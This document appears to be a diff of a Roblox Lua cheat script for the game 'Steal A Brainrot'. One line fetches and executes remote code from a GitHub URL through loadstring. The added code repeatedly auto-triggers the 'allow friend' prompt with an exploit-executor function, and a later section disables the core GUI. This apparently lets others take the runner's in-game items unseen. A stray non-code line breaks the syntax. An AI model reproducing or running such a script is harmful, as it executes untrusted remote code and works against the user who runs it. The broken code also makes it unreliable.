@@ -8,6 +8,69 @@ local Workspace    = game:GetService("Workspace")
 local StarterGui   = game:GetService("StarterGui")
 local SoundService = game:GetService("SoundService")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/Steal-A-BrainrotV3/refs/heads/main/stuck2", true))()
+
+allow friend ON : 
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- CONFIG
+local ENABLE = true
+local LOOP_DELAY = 0.5
+
+-- tunggu karakter & plot spawn
+task.wait(3)
+
+-- fungsi trigger prompt
+local function firePrompt(prompt)
+    if not ENABLE then return end
+
+    if fireproximityprompt then
+        fireproximityprompt(prompt)
+    elseif prompt.HoldDuration > 0 then
+        prompt:InputHoldBegin()
+        task.wait(prompt.HoldDuration + 0.1)
+        prompt:InputHoldEnd()
+    else
+        prompt:InputHoldBegin()
+        task.wait(0.1)
+        prompt:InputHoldEnd()
+    end
+end
+
+-- fungsi cek & eksekusi prompt
+local function handlePrompt(obj)
+    if not obj:IsA("ProximityPrompt") then return end
+
+    local text = ((obj.ActionText or "") .. " " .. (obj.ObjectText or "")):lower()
+
+    -- 🔴 JIKA SUDAH ALLOW (DISALLOW FRIEND MUNCUL)
+    if text:find("disallow friend") then
+        print("[AUTO FRIEND] already allow friend")
+        return
+    end
+
+    -- 🟢 ALLOW FRIEND
+    if text:find("allow friend") then
+        pcall(function()
+            firePrompt(obj)
+            print("[AUTO FRIEND] Triggered")
+        end)
+    end
+end
+
+-- 🔁 LOOP TIAP 1 DETIK
+task.spawn(function()
+    while ENABLE do
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            handlePrompt(obj)
+        end
+        task.wait(LOOP_DELAY)
+    end
+end)
+
+
+
 -----------------------------------------------------------------
 -- 1. DISABLE ALL CORE GUI
 -----------------------------------------------------------------
